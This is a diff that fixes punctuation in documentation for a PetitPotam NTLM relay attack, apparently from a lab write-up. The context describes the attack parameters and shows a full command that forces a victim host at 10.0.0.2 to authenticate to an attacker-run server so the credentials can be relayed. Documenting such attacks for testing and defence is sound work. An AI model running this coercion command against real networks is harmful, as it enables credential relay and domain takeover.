@@ -161,8 +161,8 @@ What follows is an example usage; let me describe the input parameters:
 - the username ("victim"),
 - the domain
 - the known password,
-- the attacker-run http server to which initiate an NTLMv2 authentication session ("attacker@80/aaa") that will be relayed
-- the IP address of the victim that will be forced to connect to the previous resource
+- the attacker-run http server to which initiate an NTLMv2 authentication session ("attacker@80/aaa") that will be relayed,
+- the IP address of the victim that will be forced to connect to the previous resource.
 ```
 python3 PetitPotam.py -u victim -d ntlmlab.local -p Qwerty123 attacker@80/aaa 10.0.0.2
 ```
